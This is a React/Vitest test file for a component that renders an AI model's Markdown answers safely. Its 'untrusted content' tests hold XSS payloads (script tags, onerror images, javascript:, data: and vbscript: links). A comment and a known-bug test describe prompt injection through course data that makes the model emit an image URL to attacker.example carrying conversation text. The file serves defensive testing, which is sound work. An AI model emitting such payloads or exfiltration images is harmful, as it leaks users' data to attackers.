import { screen, within } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { renderWithProviders } from '@/test/render'
import SafeMarkdown from './SafeMarkdown'

// SafeMarkdown renders Cora's answers. Answers are model output and can echo what a user typed, so they are
// untrusted: Markdown is rendered, HTML is not, and links cannot run script.

const render = (content: string) => renderWithProviders(<SafeMarkdown content={content} />)

describe('SafeMarkdown', () => {
  it('renders Markdown: paragraphs, emphasis and lists', () => {
    const { container } = render('Take **Python** first.\n\n*Then*:\n\n- SQL\n- Pandas\n\n1. one\n2. two')
    expect(screen.getByText('Python', { selector: 'strong' })).toBeInTheDocument()
    expect(screen.getByText('Then', { selector: 'em' })).toBeInTheDocument()
    expect(container.querySelectorAll('ul > li')).toHaveLength(2)
    expect(container.querySelectorAll('ol > li')).toHaveLength(2)
  })

  it('opens links in a new tab without giving the target access to the page', () => {
    render('See [the course](https://www.coursera.org/learn/python).')
    const link = screen.getByRole('link', { name: 'the course' })
    expect(link).toHaveAttribute('href', 'https://www.coursera.org/learn/python')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('renders GitHub-flavoured tables (used to compare courses)', () => {
    render('| Course | Rating |\n| --- | --- |\n| Python | 4.8 |\n| SQL | 4.5 |')
    const table = screen.getByRole('table')
    expect(within(table).getAllByRole('columnheader').map(h => h.textContent)).toEqual(['Course', 'Rating'])
    expect(within(table).getAllByRole('row')).toHaveLength(3)
    expect(within(table).getByRole('cell', { name: '4.8' })).toBeInTheDocument()
  })

  describe('untrusted content', () => {
    it('does not render raw HTML elements', () => {
      const { container } = render('Hello <img src=x onerror="alert(1)"> <script>alert(2)</script> <b>bold</b>')
      expect(container.querySelector('img')).toBeNull()
      expect(container.querySelector('script')).toBeNull()
      expect(container.querySelector('b')).toBeNull()
      expect(container.querySelector('[onerror]')).toBeNull()
    })

    it.each([
      ['javascript:', '[click](javascript:alert(1))'],
      ['JavaScript: with mixed case', '[click](JaVaScRiPt:alert(1))'],
      ['data: URL', '[click](data:text/html,<script>alert(1)</script>)'],
      ['vbscript:', '[click](vbscript:msgbox(1))'],
    ])('neutralises %s links', (_label, markdown) => {
      const { container } = render(markdown)
      for (const a of container.querySelectorAll('a')) {
        expect(a.getAttribute('href') ?? '').not.toMatch(/^\s*(javascript|data|vbscript):/i)
      }
    })

    it('neutralises javascript: in autolinks', () => {
      const { container } = render('<javascript:alert(1)>')
      for (const a of container.querySelectorAll('a')) expect(a.getAttribute('href') ?? '').not.toMatch(/javascript:/i)
    })

    // Cora's context includes third-party course data, so injected text can make the model emit an image whose URL
    // carries data from the conversation; rendering it makes the browser send that data to any host automatically.
    it.fails('KNOWN BUG (B29): does not load images from arbitrary hosts in answers (data exfiltration)', () => {
      const { container } = render('Here you go ![chart](https://attacker.example/pixel?d=my%20question)')
      const sources = [...container.querySelectorAll('img')].map(img => img.getAttribute('src'))
      expect(sources.filter(src => src?.includes('attacker.example'))).toEqual([])
    })

    it('renders an empty answer without crashing', () => {
      const { container } = render('')
      expect(container).toBeInTheDocument()
    })
  })
})
